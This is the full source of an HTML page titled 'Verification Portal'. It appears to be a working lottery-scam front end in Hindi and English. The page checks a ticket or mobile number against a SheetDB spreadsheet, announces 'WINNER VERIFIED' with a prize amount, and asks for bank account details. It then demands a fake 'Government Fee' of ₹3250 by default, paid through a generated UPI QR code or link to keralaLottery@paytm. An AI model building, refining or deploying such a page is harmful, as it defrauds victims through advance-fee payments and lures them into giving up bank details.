<!DOCTYPE html>
<html lang="hi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Portal</title>
  <style>
    * { box-sizing: border-box; font-family: sans-serif; margin: 0; padding: 0; }
    body { background: #0b1329; color: #fff; padding: 15px; display: flex; justify-content: center; }
    .box { width: 100%; max-width: 420px; background: #132247; border: 1px solid #ffcc00; border-radius: 12px; padding: 15px; }
    .clock { background: #080f24; border: 1px solid #2e4374; border-radius: 6px; padding: 6px; text-align: center; color: #93c5fd; font-size: 13px; font-weight: bold; margin-bottom: 12px; }
    input { width: 100%; padding: 10px; margin: 6px 0 10px; border-radius: 6px; border: 1px solid #2e4374; background: #080f24; color: #fff; }
    .btn { width: 100%; padding: 11px; background: #ffcc00; color: #000; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; }
    .pay-btn { background: #22c55e; color: #fff; margin-top: 10px; }
    #resultBox, #feeBox { display: none; margin-top: 15px; border-top: 1px dashed #445; padding-top: 12px; }
    .card-info { background: #080f24; padding: 10px; border-radius: 6px; margin: 10px 0; font-size: 13px; }
    .qr-wrap { background: #fff; padding: 8px; border-radius: 8px; display: inline-block; margin: 10px 0; }
  </style>
</head>
<body>

<div class="box">
  <!-- 1. Real Time Clock -->
  <div class="clock" id="liveClock">Loading Date & Time...</div>

  <!-- 2. Search -->
  <label style="font-size: 13px;">Ticket ya Mobile Number:</label>
  <input type="text" id="searchInput" placeholder="e.g. KL-584920 / 9876543210">
  <button class="btn" onclick="checkTicket()">Check Status</button>
  <div id="status" style="text-align: center; font-size: 13px; margin-top: 8px;"></div>

  <!-- 3. Result Section -->
  <div id="resultBox">
    <div style="color: #4ade80; text-align: center; font-weight: bold;">🎉 WINNER VERIFIED</div>
    <div class="card-info">
      <p>Name: <b id="resName">-</b></p>
      <p>Prize: <b id="resPrize" style="color:#ffcc00">-</b></p>
      <p>Amount: <b id="resAmt" style="color:#4ade80">-</b></p>
    </div>

    <!-- 4. Withdraw Form -->
    <h4 style="color: #ffcc00; margin-bottom: 5px;">Bank Details:</h4>
    <input type="text" id="wName" placeholder="Account Holder Name">
    <input type="text" id="wBank" placeholder="Bank Name">
    <input type="number" id="wAcc" placeholder="Account Number">
    <input type="text" id="wIfsc" placeholder="IFSC Code" style="text-transform: uppercase;">
    <button class="btn" onclick="submitWithdraw()">Submit & Proceed to Fee</button>

    <!-- 5. Government Fee & Dynamic QR -->
    <div id="feeBox" style="text-align: center;">
      <p style="font-size: 14px;">Government Fee: <b id="resFee" style="color: #ffcc00;">₹0</b></p>
      <div class="qr-wrap">
        <img id="qrImg" src="" width="160" height="160" alt="QR Code">
      </div>
      <p style="font-size: 12px; color: #aaa;" id="upiText">UPI ID: -</p>
      <button class="btn pay-btn" onclick="payUpi()">Pay via UPI App Directly</button>
    </div>
  </div>
</div>

<script>
  const API = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
  let fee = "3250", upi = "keralaLottery@paytm";

  // Clock
  setInterval(() => {
    const d = new Date();
    document.getElementById("liveClock").textContent = d.toLocaleDateString('en-GB') + " | " + d.toLocaleTimeString('en-US');
  }, 1000);

  // Search
  async function checkTicket() {
    const q = document.getElementById("searchInput").value.trim().toLowerCase();
    const st = document.getElementById("status");
    if (!q) { st.textContent = "Kripya number dalein."; st.style.color = "#f87171"; return; }
    st.textContent = "Checking..."; st.style.color = "#ffcc00";

    try {
      const res = await fetch(API);
      const data = await res.json();
      const item = data.find(r => (r.ticket && r.ticket.trim().toLowerCase() === q) || (r.mobile && r.mobile.trim() === q));

      if (item) {
        st.textContent = "";
        document.getElementById("resName").textContent = item.name || "-";
        document.getElementById("resPrize").textContent = item.prize || "-";
        document.getElementById("resAmt").textContent = item.amount || "-";
        document.getElementById("wName").value = item.name || "";
        fee = item.fee || "3250";
        upi = item.upiId || "keralaLottery@paytm";
        document.getElementById("resFee").textContent = "₹" + fee;
        document.getElementById("resultBox").style.display = "block";
      } else {
        st.textContent = "Data nahi mila. Dobara check karein."; st.style.color = "#f87171";
      }
    } catch (e) {
      st.textContent = "Server error. Dobara koshish karein."; st.style.color = "#f87171";
    }
  }

  // Withdraw & QR
  function submitWithdraw() {
    const name = document.getElementById("wName").value.trim();
    const bank = document.getElementById("wBank").value.trim();
    const acc = document.getElementById("wAcc").value.trim();
    const ifsc = document.getElementById("wIfsc").value.trim();

    if (!name || !bank || !acc || !ifsc) {
      alert("Kripya saari bank details bharein!");
      return;
    }

    const upiLink = `upi://pay?pa=${encodeURIComponent(upi)}&pn=Verification&am=${fee}&cu=INR&tn=Fee`;
    document.getElementById("qrImg").src = `https://quickchart.io/qr?text=${encodeURIComponent(upiLink)}&size=160`;
    document.getElementById("upiText").textContent = `UPI ID: ${upi}`;
    document.getElementById("feeBox").style.display = "block";
  }

  function payUpi() {
    window.location.href = `upi://pay?pa=${encodeURIComponent(upi)}&pn=Verification&am=${fee}&cu=INR&tn=Fee`;
  }
</script>

</body>
</html>
